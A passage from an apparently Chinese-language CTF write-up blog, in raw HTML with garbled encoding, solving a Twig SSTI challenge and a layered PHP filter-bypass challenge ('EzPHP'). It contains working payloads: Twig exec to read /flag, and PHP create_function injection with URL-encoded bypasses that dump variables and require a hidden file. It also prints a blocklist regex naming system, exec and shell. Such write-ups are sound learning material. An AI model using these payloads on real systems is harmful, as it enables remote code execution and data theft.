href=https://www.k0rz3n.com/2018/11/12/%e4%b8%80%e7%af%87%e6%96%87%e7%ab%a0%e5%b8%a6%e4%bd%a0%e7%90%86%e8%a7%a3%e6%bc%8f%e6%b4%9e%e4%b9%8bSSTI%e6%bc%8f%e6%b4%9e/#2-Twig target=_blank rel=noopener>ä¸€ç¯‡æ–‡ç« å¸¦ä½ ç†è§£æ¼æ´ä¹‹SSTIæ¼æ´/#2-Twig</a></p><p>hint:</p><p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/img/image-20201004222013695.png loading=lazy></p><p>æ ¹æ®æ–‡ç« å¾—åˆ°payloadï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>{{_self.env.registerUndefinedFilterCallback(&#34;exec&#34;)}}{{_self.env.getFilter(&#34;cat /flag&#34;)}}
</span></span></code></pre></td></tr></table></div></div><p>å¾—åˆ°flagï¼š</p><p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/img/image-20201004221654162.png loading=lazy></p><h2 id=ezphp>EzPHP</h2><blockquote><p>ezä¸ä¸€å®šezï¼Œä½†æ˜¯hardæ˜¯çœŸçš„hard</p></blockquote><p>hintï¼š</p><p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/img/image-20201004223440325.png loading=lazy></p><p>base32è§£ç ï¼š</p><p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/img/image-20201004223456332.png loading=lazy></p><p>å¾—åˆ°æºç ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$file</span> <span class=o>=</span> <span class=s2>&#34;1nD3x.php&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$shana</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;shana&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=nv>$passwd</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;passwd&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=nv>$arg</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$code</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=s2>&#34;&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nv>$_SERVER</span><span class=p>)</span> <span class=p>{</span> 
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&#34;|\&#39;|log/i&#39;</span><span class=p>,</span> <span class=nv>$_SERVER</span><span class=p>[</span><span class=s1>&#39;QUERY_STRING&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=p>)</span>  
</span></span><span class=line><span class=cl>        <span class=k>die</span><span class=p>(</span><span class=s1>&#39;You seem to want to do something bad?&#39;</span><span class=p>);</span> 
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/http|https/i&#39;</span><span class=p>,</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/^aqua_is_cute$/&#39;</span><span class=p>,</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;debu&#39;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;debu&#39;</span><span class=p>]</span> <span class=o>!==</span> <span class=s1>&#39;aqua_is_cute&#39;</span><span class=p>)</span> <span class=p>{</span> 
</span></span><span class=line><span class=cl>        <span class=nv>$file</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s2>&#34;file&#34;</span><span class=p>];</span> 
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=s2>&#34;Neeeeee! Good Job!&lt;br&gt;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> 
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>else</span> <span class=k>die</span><span class=p>(</span><span class=s1>&#39;fxck you! What do you want to do ?!&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nv>$_REQUEST</span><span class=p>)</span> <span class=p>{</span> 
</span></span><span class=line><span class=cl>    <span class=k>foreach</span><span class=p>(</span><span class=nv>$_REQUEST</span> <span class=k>as</span> <span class=nv>$value</span><span class=p>)</span> <span class=p>{</span> 
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/[a-zA-Z]/i&#39;</span><span class=p>,</span> <span class=nv>$value</span><span class=p>))</span>  
</span></span><span class=line><span class=cl>            <span class=k>die</span><span class=p>(</span><span class=s1>&#39;fxck you! I hate English!&#39;</span><span class=p>);</span> 
</span></span><span class=line><span class=cl>    <span class=p>}</span> 
</span></span><span class=line><span class=cl><span class=p>}</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$file</span><span class=p>)</span> <span class=o>!==</span> <span class=s1>&#39;debu_debu_aqua&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>die</span><span class=p>(</span><span class=s2>&#34;Aqua is the cutest five-year-old child in the world! Isn&#39;t it ?&lt;br&gt;&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span> <span class=nx>sha1</span><span class=p>(</span><span class=nv>$shana</span><span class=p>)</span> <span class=o>===</span> <span class=nx>sha1</span><span class=p>(</span><span class=nv>$passwd</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=nv>$shana</span> <span class=o>!=</span> <span class=nv>$passwd</span> <span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=nx>extract</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s2>&#34;flag&#34;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s2>&#34;Very good! you know my password. But what is flag?&lt;br&gt;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>die</span><span class=p>(</span><span class=s2>&#34;fxck you! you don&#39;t know my password! And you don&#39;t know sha1! why you come here!&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/^[a-z0-9]*$/isD&#39;</span><span class=p>,</span> <span class=nv>$code</span><span class=p>)</span> <span class=o>||</span> 
</span></span><span class=line><span class=cl><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\{|\%|x|\&amp;|\$|\*|\||\&lt;|\&#34;|\&#39;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#39;</span><span class=p>,</span> <span class=nv>$arg</span><span class=p>)</span> <span class=p>)</span> <span class=p>{</span> 
</span></span><span class=line><span class=cl>    <span class=k>die</span><span class=p>(</span><span class=s2>&#34;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#39;t get my flag =w=&#34;</span><span class=p>);</span> 
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>else</span> <span class=p>{</span> 
</span></span><span class=line><span class=cl>    <span class=k>include</span> <span class=s2>&#34;flag.php&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nv>$code</span><span class=p>(</span><span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=nv>$arg</span><span class=p>);</span> 
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><ol><li><p>å…ˆçœ‹ä¸€ä¸‹ç¬¬ä¸€å±‚è¿‡æ»¤ï¼š<a class=link href=https://blog.csdn.net/fjb2080/article/details/80548431 target=_blank rel=noopener>æœ‰å…³$_SERVERçš„çŸ¥è¯†</a></p><p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/img/image-20201009192644228.png loading=lazy alt=image-20201009192644228></p><p>æ‰€ä»¥æœ¬é¢˜ä¸­$_SERVER[&lsquo;QUERY_STRING&rsquo;]è¿‡æ»¤çš„æ˜¯getçš„å‚æ•°ï¼Œç›´æ¥ç”¨urlç¼–ç ç»•è¿‡å³å¯ï¼Œæœ‰ä¸€ä¸ªå°å‘å°±æ˜¯ï¼šä¸€èˆ¬ç½‘ä¸Šçš„åœ¨çº¿urlç¼–ç /è§£ç ä¸ä¼šå¯¹å­—æ¯æ•°å­—è¿›è¡Œç¼–ç ï¼Œå› ä¸ºï¼š</p><blockquote><p>&ldquo;&mldr;Only alphanumerics [0-9a-zA-Z], the special characters &ldquo;$-<em>.+!*&rsquo;(),&rdquo; [not including the quotes - ed], and reserved characters used for their reserved purposes may be used unencoded within a URL.&rdquo;</em></p><p>&ldquo;åªæœ‰å­—æ¯å’Œæ•°å­—[0-9a-zA-Z]ã€ä¸€äº›ç‰¹æ®Šç¬¦å·&rdquo;$-_.+!*&rsquo;(),"[ä¸åŒ…æ‹¬åŒå¼•å·]ã€ä»¥åŠæŸäº›ä¿ç•™å­—ï¼Œæ‰å¯ä»¥ä¸ç»è¿‡ç¼–ç ç›´æ¥ç”¨äºURLã€‚"</p></blockquote><p>ä¸€èˆ¬æ¥è¯´è¿™äº›å­—ç¬¦çš„urlç¼–ç å°±æ˜¯asciiç å‰é¢åŠ ä¸ª<code>%</code>,å…·ä½“å‚è€ƒï¼šhttps://www.w3school.com.cn/tags/html_ref_urlencode.htm</p></li><li><p>ç¬¬äºŒå±‚è¿‡æ»¤åˆè¦åœ¨debuä¸­æ­£åˆ™åŒ¹é…åˆ°"aqua_is_cute"å¹¶ä¸”ç”¨^å’Œ$å¡ä½äº†ä¸¤ç«¯ï¼Œåˆè¦æ±‚debu !== &ldquo;aqua_is_cute&rdquo; ï¼Œçœ‹ä¼¼ä¸å¯èƒ½ï¼Œä½†æ˜¯ç»“å°¾æ²¡æœ‰<code>/D</code>çš„è¯ï¼Œ<code>$</code>ä¼šçœç•¥å¥å°¾çš„<code>%0a</code>ã€‚æ‰€ä»¥åªéœ€è¦ä¼ å…¥</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>debu=aqua_is_cute%0a
</span></span></code></pre></td></tr></table></div></div><p>å†urlç¼–ç ä¸€ä¸‹ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a
</span></span></code></pre></td></tr></table></div></div></li><li><p>ç¬¬ä¸‰å±‚è¿‡æ»¤æ˜¯çœ‹çœ‹$_REQUESTä¸­æœ‰æ²¡æœ‰è‹±æ–‡å­—æ¯ï¼Œå³ä½¿æ˜¯urlç¼–ç ï¼Œå› ä¸ºæ˜¯16è¿›åˆ¶ï¼Œæ‰€ä»¥ä¾ç„¶ä¼šæœ‰è‹±æ–‡å­—æ¯çš„å‡ºç°ï¼Œè¿™é‡Œæ¶‰åŠåˆ°$_REQUESTçš„ä¸€ä¸ªç‰¹æ€§(bug)ï¼šå½“GETå’ŒPOSTéƒ½å­˜åœ¨åŒä¸€ä¸ªå˜é‡åçš„æ—¶å€™ï¼Œåªè·å–POSTä¸­çš„å€¼ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡è¿™ä¸ªç‰¹æ€§æ¥ç»•è¿‡æ­£åˆ™çš„åŒ¹é…ã€‚å¦‚å›¾ï¼š</p><p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/img/image-20201009195949155.png loading=lazy></p></li><li><p>ç¬¬å››å±‚ï¼š<code>if (file_get_contents($file) !== 'debu_debu_aqua')</code>å°±æ˜¯è¦åœ¨$fileä¸­å†™å…¥â€œdebu_debu_aquaâ€ï¼Œå¯ä»¥ç”¨php://inputæˆ–è€…data://text/plain,(urlç¼–å†™å†…å®¹)ç»•è¿‡ï¼Œå‚è€ƒï¼š<a class=link href=http://blog.sina.com.cn/s/blog_8a65767d0102v94a.html target=_blank rel=noopener>PHP file_get_contents ç»•è¿‡</a></p><p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/img/image-20201009205036230.png loading=lazy></p></li><li><p>ç¬¬äº”å±‚ï¼š<a class=link href=https://blog.csdn.net/cyyAray/article/details/78340241 target=_blank rel=noopener>PHP ä¸­çš„sha1()å’ŒMD5()å‡½æ•°æ¼æ´</a></p><p>å½“ä¼ å…¥?shana[]&amp;passwd[]=123æ—¶ï¼Œä»–ä¿©çš„sha1éƒ½ä¸ºnullï¼Œä½†æ˜¯ä¸¤è€…ä¸ç›¸ç­‰ã€‚</p><p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/img/image-20201009205507311.png loading=lazy alt=image-20201009205507311></p></li><li><p>ç¬¬å…­å±‚ï¼Œä¹Ÿæ˜¯æœ€åä¸€å±‚äº†ã€‚</p><p>å‚è€ƒï¼š<a class=link href=https://zhuanlan.zhihu.com/p/58713380 target=_blank rel=noopener>ä»£ç å®¡è®¡ä»å…¥é—¨åˆ°æ”¾å¼ƒ(ä¸€) & function</a></p><p>ä»å‚è€ƒæ–‡ç« å¯çŸ¥ï¼Œ<code>&amp;5c</code>å³<code>\</code>æ‰“å¤´æ—¶å¯ä»¥æ­£å¸¸è¿è¡Œvar_dump()ï¼Œä½†æ˜¯ã€‚ã€‚ã€‚æœ¬é¢˜ä¸­å˜é‡codeå’Œargæ²¡åŠæ³•getã€‚ã€‚ã€‚</p><p>ç„¶åæˆ‘å‘ç°åœ¨sha1è¿‡æ»¤çš„åœ°æ–¹ä¼šæ‰§è¡Œä¸€ä¸ªextractå‡½æ•°ï¼ˆåˆšå¼€å§‹è¿˜æ²¡çœ‹è§ï¼Œæ‰¾äº†å¥½ä¹…ã€‚ã€‚ã€‚ï¼‰è¿™æ˜¯ä¸€ä¸ªç»å…¸çš„å˜é‡è¦†ç›–çš„é—®é¢˜ã€‚</p><p>ä¸è¿‡ä¹Ÿæœ‰ä¸ªå°å‘ï¼Œå°±æ˜¯åˆšå¼€å§‹ä¸çŸ¥é“å¦‚ä½•å˜é‡è¦†ç›–ï¼Œç½‘ä¸Šçš„èµ„æ–™åŸºæœ¬éƒ½æ˜¯<code>extract($_GET); </code>ï¼Œç›´æ¥ä¼ å…¥<code>code=xxx&amp;arg=xxx</code>å³å¯ï¼›è¿™é‡Œçš„<code>extract($_GET["flag"]); </code>éœ€è¦ä¼ å…¥<code>flag[code]=xxx&amp;flag[arg]=xxx</code></p><p>è¾“å…¥<code>flag[code]=%5cvar_dump&amp;flag[arg]=23333</code>ï¼ˆurlç¼–ç ä¹‹åä¸ºï¼š<code>%66%6c%61%67%5b%63%6f%64%65%5d=%5c%76%61%72%5f%64%75%6d%70&%66%6c%61%67%5b%61%72%67%5d=2333</code>ï¼‰è¿›è¡Œæµ‹è¯•:</p><p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/img/image-20201010111707519.png loading=lazy alt=å¥‡å¥‡æ€ªæ€ªçš„ä¸œè¥¿æ˜¯flag.phpçš„å†…å®¹></p><p><code>çåæ¹ªæ©æ¬“å™·é”›å±¼ç¶˜é‘³èŠ¥å¬é’æ¿ç• éšæ¥‹ç´µ</code></p><p>F12ï¼š<img src=https://cdn.jsdelivr.net/gh/zk1te/img/img/image-20201010114813584.png loading=lazy alt=image-20201010114813584></p><p>åˆ°è¿™é‡Œæ€è·¯å°±æ–­äº†ï¼Œä»¥ä¸ºè¿™äº›ç”Ÿåƒ»å­—æ˜¯flagï¼Œä½†æ˜¯çœ‹äº†wpä¹‹åæ‰å‘ç°ä¸æ˜¯ã€‚åœ¨<code>$code('', $arg);</code>å¤„æ²¡æœ‰æ‰§è¡Œä»»ä½•æŒ‡ä»¤ï¼Œæˆ‘è¿˜ä»¥ä¸ºè¢«bançš„å‡½æ•°è¿™ä¹ˆå¤šï¼Œä¸éœ€è¦ç»•è¿‡ï¼Œä»¥åŠincludeäº†flag.phpï¼Œä»¥åŠå‡ºç°äº†flagå­—æ ·ï¼Œå¯¼è‡´æˆ‘ä»¥ä¸ºflagå‡ºäº†ï¼Œåé¢æ˜¯ä¸ªmiscã€‚</p><p>é¡ºç€wpçš„æ€è·¯å¾€ä¸‹ï¼šå› ä¸ºincludeäº†flag.phpï¼Œæ‰€ä»¥å¯ä»¥ç”¨<code>get_defined_vars()</code>å°†æ‰€æœ‰å˜é‡dumpå‡ºæ¥</p><p>æœ¬æ¥æƒ³è¯•è¯•èƒ½ä¸èƒ½ä¸åˆ©ç”¨create_functionç›´æ¥dumpï¼Œåé¢å‘ç°ä¸è¡Œï¼š<img src=https://cdn.jsdelivr.net/gh/zk1te/img/img/image-20201010155027164.png loading=lazy></p><p>å› ä¸ºæ­¤æ—¶æ‰§è¡Œçš„æ˜¯<code>var_dump('','get_defined_vars()')</code>ï¼Œæ‰€ä»¥è¿˜æ˜¯å¾—åˆ©ç”¨create_functionï¼ŒåŸç†è§£æï¼š<a class=link href=https://paper.seebug.org/94/ target=_blank rel=noopener>[ç§‘æ™®å‘] è§£æcreate_function() && å¤ç°wp</a></p><p>æ„é€ payloadï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>flag</span><span class=p>[</span><span class=n>code</span><span class=p>]</span><span class=o>=</span><span class=n>create_function</span><span class=o>&amp;</span><span class=n>flag</span><span class=p>[</span><span class=n>arg</span><span class=p>]</span><span class=o>=</span><span class=p>}</span><span class=n>var_dump</span><span class=p>(</span><span class=n>get_defined_vars</span><span class=p>());</span><span class=o>//</span>
</span></span><span class=line><span class=cl><span class=n>urlç¼–ç ä¹‹åä¸º</span><span class=err>ï¼š</span><span class=o>%</span><span class=mi>66</span><span class=o>%</span><span class=mi>6</span><span class=n>c</span><span class=o>%</span><span class=mi>61</span><span class=o>%</span><span class=mi>67</span><span class=o>%</span><span class=mi>5</span><span class=n>b</span><span class=o>%</span><span class=mi>63</span><span class=o>%</span><span class=mi>6</span><span class=n>f</span><span class=o>%</span><span class=mi>64</span><span class=o>%</span><span class=mi>65</span><span class=o>%</span><span class=mi>5</span><span class=n>d</span><span class=o>=%</span><span class=mi>63</span><span class=o>%</span><span class=mi>72</span><span class=o>%</span><span class=mi>65</span><span class=o>%</span><span class=mi>61</span><span class=o>%</span><span class=mi>74</span><span class=o>%</span><span class=mi>65</span><span class=o>%</span><span class=mi>5</span><span class=n>f</span><span class=o>%</span><span class=mi>66</span><span class=o>%</span><span class=mi>75</span><span class=o>%</span><span class=mi>6</span><span class=n>e</span><span class=o>%</span><span class=mi>63</span><span class=o>%</span><span class=mi>74</span><span class=o>%</span><span class=mi>69</span><span class=o>%</span><span class=mi>6</span><span class=n>f</span><span class=o>%</span><span class=mi>6</span><span class=n>e</span><span class=o>&amp;%</span><span class=mi>66</span><span class=o>%</span><span class=mi>6</span><span class=n>c</span><span class=o>%</span><span class=mi>61</span><span class=o>%</span><span class=mi>67</span><span class=o>%</span><span class=mi>5</span><span class=n>b</span><span class=o>%</span><span class=mi>61</span><span class=o>%</span><span class=mi>72</span><span class=o>%</span><span class=mi>67</span><span class=o>%</span><span class=mi>5</span><span class=n>d</span><span class=o>=%</span><span class=mi>7</span><span class=n>d</span><span class=o>%</span><span class=mi>76</span><span class=o>%</span><span class=mi>61</span><span class=o>%</span><span class=mi>72</span><span class=o>%</span><span class=mi>5</span><span class=n>f</span><span class=o>%</span><span class=mi>64</span><span class=o>%</span><span class=mi>75</span><span class=o>%</span><span class=mi>6</span><span class=n>d</span><span class=o>%</span><span class=mi>70</span><span class=o>%</span><span class=mi>28</span><span class=o>%</span><span class=mi>67</span><span class=o>%</span><span class=mi>65</span><span class=o>%</span><span class=mi>74</span><span class=o>%</span><span class=mi>5</span><span class=n>f</span><span class=o>%</span><span class=mi>64</span><span class=o>%</span><span class=mi>65</span><span class=o>%</span><span class=mi>66</span><span class=o>%</span><span class=mi>69</span><span class=o>%</span><span class=mi>6</span><span class=n>e</span><span class=o>%</span><span class=mi>65</span><span class=o>%</span><span class=mi>64</span><span class=o>%</span><span class=mi>5</span><span class=n>f</span><span class=o>%</span><span class=mi>76</span><span class=o>%</span><span class=mi>61</span><span class=o>%</span><span class=mi>72</span><span class=o>%</span><span class=mi>73</span><span class=o>%</span><span class=mi>28</span><span class=o>%</span><span class=mi>29</span><span class=o>%</span><span class=mi>29</span><span class=o>%</span><span class=mi>3</span><span class=n>b</span><span class=o>%</span><span class=mi>2</span><span class=n>f</span><span class=o>%</span><span class=mi>2</span><span class=n>f</span>
</span></span></code></pre></td></tr></table></div></div><p>ï¼ˆåˆšå¼€å§‹ä»¥ä¸ºè¿‡æ»¤äº†<code>}</code>,ä½†æ˜¯ä»”ç»†çœ‹çœ‹å‘ç°åªè¿‡æ»¤äº†<code>{</code>ã€‚ã€‚ã€‚ä»¥åŠï¼Œä¸ºä»€ä¹ˆcodeä¸éœ€è¦<code>%5c</code>ï¼‰</p><p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/img/image-20201010160637448.png loading=lazy></p><p>å°†æ‰€æœ‰å˜é‡dumpå‡ºæ¥ä¹‹åå‘ç°æç¤ºçœŸæ­£çš„flagåœ¨rea1fl4g.php</p><p>å› ä¸ºè¿‡æ»¤äº†includeï¼Œæ‰€ä»¥å¯ä»¥ç”¨requireä»£æ›¿includeï¼Œå°†rea1fl4g.phpåŒ…å«è¿›æ¥ï¼Œå¹¶ä¸”è¿‡æ»¤äº†<code>Â·</code>ï¼Œå¯ä»¥ç”¨base64ç»•è¿‡</p><p>payloadï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>flag</span><span class=p>[</span><span class=n>code</span><span class=p>]</span><span class=o>=</span><span class=n>create_function</span><span class=o>&amp;</span><span class=n>flag</span><span class=p>[</span><span class=n>arg</span><span class=p>]</span><span class=o>=</span><span class=p>}</span><span class=n>require</span><span class=p>(</span><span class=n>base64_decode</span><span class=p>(</span><span class=n>cmVhMWZsNGcucGhw</span><span class=p>));</span><span class=n>var_dump</span><span class=p>(</span><span class=n>get_defined_vars</span><span class=p>());</span><span class=o>//</span>
</span></span><span class=line><span class=cl><span class=n>cmVhMWZsNGcucGhw</span><span class=p>:</span><span class=n>rea1fl4g</span><span class=o>.</span><span class=n>phpçš„base64ç¼–ç </span>
</span></span><span class=line><span class=cl><span class=n>urlç¼–ç ä¹‹åä¸º</span><span class=err>ï¼š</span>
</span></span><span class=line><span class=cl><span class=o>%</span><span class=mi>66</span><span class=o>%</span><span class=mi>6</span><span class=n>c</span><span class=o>%</span><span class=mi>61</span><span class=o>%</span><span class=mi>67</span><span class=o>%</span><span class=mi>5</span><span class=n>b</span><span class=o>%</span><span class=mi>63</span><span class=o>%</span><span class=mi>6</span><span class=n>f</span><span class=o>%</span><span class=mi>64</span><span class=o>%</span><span class=mi>65</span><span class=o>%</span><span class=mi>5</span><span class=n>d</span><span class=o>=%</span><span class=mi>63</span><span class=o>%</span><span class=mi>72</span><span class=o>%</span><span class=mi>65</span><span class=o>%</span><span class=mi>61</span><span class=o>%</span><span class=mi>74</span><span class=o>%</span><span class=mi>65</span><span class=o>%</span><span class=mi>5</span><span class=n>f</span><span class=o>%</span><span class=mi>66</span><span class=o>%</span><span class=mi>75</span><span class=o>%</span><span class=mi>6</span><span class=n>e</span><span class=o>%</span><span class=mi>63</span><span class=o>%</span><span class=mi>74</span><span class=o>%</span><span class=mi>69</span><span class=o>%</span><span class=mi>6</span><span class=n>f</span><span class=o>%</span><span class=mi>6</span><span class=n>e</span><span class=o>&amp;%</span><span class=mi>66</span><span class=o>%</span><span class=mi>6</span><span class=n>c</span><span class=o>%</span><span class=mi>61</span><span class=o>%</span><span class=mi>67</span><span class=o>%</span><span class=mi>5</span><span class=n>b</span><span class=o>%</span><span class=mi>61</span><span class=o>%</span><span class=mi>72</span><span class=o>%</span><span class=mi>67</span><span class=o>%</span><span class=mi>5</span><span class=n>d</span><span class=o>=%</span><span class=mi>7</span><span class=n>d</span><span class=o>%</span><span class=mi>72</span><span class=o>%</span><span class=mi>65</span><span class=o>%</span><span class=mi>71</span><span class=o>%</span><span class=mi>75</span><span class=o>%</span><span class=mi>69</span><span class=o>%</span><span class=mi>72</span><span class=o>%</span><span class=mi>65</span><span class=o>%</span><span class=mi>28</span><span class=o>%</span><span class=mi>62</span><span class=o>%</span><span class=mi>61</span><span class=o>%</span><span class=mi>73</span><span class=o>%</span><span class=mi>65</span><span class=o>%</span><span class=mi>36</span><span class=o>%</span><span class=mi>34</span><span class=o>%</span><span class=mi>5</span><span class=n>f</span><span class=o>%</span><span class=mi>64</span><span class=o>%</span><span class=mi>65</span><span class=o>%</span><span class=mi>63</span><span class=o>%</span><span class=mi>6</span><span class=n>f</span><span class=o>%</span><span class=mi>64</span><span class=o>%</span><span class=mi>65</span><span class=o>%</span><span class=mi>28</span><span class=o>%</span><span class=mi>63</span><span class=o>%</span><span class=mi>6</span><span class=n>d</span><span class=o>%</span><span class=mi>56</span><span class=o>%</span><span class=mi>68</span><span class=o>%</span><span class=mi>4</span><span class=n>d</span><span class=o>%</span><span class=mi>57</span><span class=o>%</span><span class=mi>5</span><span class=n>a</span><span class=o>%</span><span class=mi>73</span><span class=o>%</span><span class=mi>4</span><span class=n>e</span><span class=o>%</span><span class=mi>47</span><span class=o>%</span><span class=mi>63</span><span class=o>%</span><span class=mi>75</span><span class=o>%</span><span class=mi>63</span><span class=o>%</span><span class=mi>47</span><span class=o>%</span><span class=mi>68</span><span class=o>%</span><span class=mi>77</span><span class=o>%</span><span 